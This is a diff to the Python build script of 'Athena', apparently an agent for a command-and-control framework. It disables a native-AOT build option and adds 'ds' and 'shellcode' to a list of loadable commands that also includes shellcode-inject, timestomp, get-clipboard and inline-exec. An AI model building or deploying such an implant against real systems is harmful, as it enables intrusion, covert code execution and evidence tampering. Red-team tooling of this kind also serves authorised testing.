@@ -203,12 +203,12 @@ class athena(PayloadType):
             default_value="Release",
             description="Select compiler configuration release/debug"
         ),
-        BuildParameter(
-            name="native-aot",
-            parameter_type=BuildParameterType.Boolean,
-            default_value= False,
-            description="Compile using the experimental Native AOT"
-        ),
+        # BuildParameter(
+        #     name="native-aot",
+        #     parameter_type=BuildParameterType.Boolean,
+        #     default_value= False,
+        #     description="Compile using the experimental Native AOT"
+        # ),
         BuildParameter(
             name="output-type",
             parameter_type=BuildParameterType.ChooseOne,
@@ -234,13 +234,13 @@ class athena(PayloadType):
             roots_replace = ""
 
             #validate parameters
-            for x in self.build_parameters:
-                if x.name == "single-file":
-                    if(self.get_parameter("native-aot") == True):
-                        x.value = False
-                if x.name == "trimmed":
-                    if(self.get_parameter("native-aot") == True):
-                        x.value = True
+            # for x in self.build_parameters:
+            #     if x.name == "single-file":
+            #         if(self.get_parameter("native-aot") == True):
+            #             x.value = False
+            #     if x.name == "trimmed":
+            #         if(self.get_parameter("native-aot") == True):
+            #             x.value = True
 
             add_profile_params = ""
 
@@ -276,8 +276,8 @@ class athena(PayloadType):
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
 
             stdout_err = ""
-            loadable_commands = ["arp","cat","cd","coff","cp","crop","drives","env","farmer","get-clipboard","get-localgroup","get-sessions","get-shares","hostname","ifconfig","inline-exec",
-            "kill","ls","mkdir","mv","nslookup","patch","ps","pwd","reg","rm","sftp","shell","shellcode-inject","ssh","tail","test-port","timestomp","uptime","wget","whoami","win-enum-resources"]
+            loadable_commands = ["arp","cat","cd","coff","cp","crop","ds","drives","env","farmer","get-clipboard","get-localgroup","get-sessions","get-shares","hostname","ifconfig","inline-exec",
+            "kill","ls","mkdir","mv","nslookup","patch","ps","pwd","reg","rm","sftp","shell","shellcode", "shellcode-inject","ssh","tail","test-port","timestomp","uptime","wget","whoami","win-enum-resources"]
 
             build_msg += "Determining selected OS...{}".format(self.selected_os) + '\n'
             if self.selected_os.upper() == "WINDOWS":
@@ -299,10 +299,12 @@ class athena(PayloadType):
             build_msg += "RID set to...{}".format(rid) + '\n'
             os.environ["DOTNET_RUNTIME_IDENTIFIER"] = rid
             
-            if self.get_parameter("native-aot"):
-                directives += ";NATIVEAOT"
-            else:
-                directives += ";DYNAMIC"
+            # if self.get_parameter("native-aot"):
+            #     directives += ";NATIVEAOT"
+            # else:
+            #     directives += ";DYNAMIC"
+
+            directives += ";DYNAMIC"
 
             for cmd in self.commands.get_commands():
                 if cmd in loadable_commands:
@@ -342,7 +344,7 @@ class athena(PayloadType):
                 self.get_parameter("single-file"), 
                 self.get_parameter("compressed"), 
                 self.get_parameter("trimmed"), 
-                self.get_parameter("native-aot"), 
+                False, #Setting native-aot to false temporarily while I explore keeping it or not.
                 agent_build_path.name, 
                 self.selected_os.lower(),
                 add_profile_params)
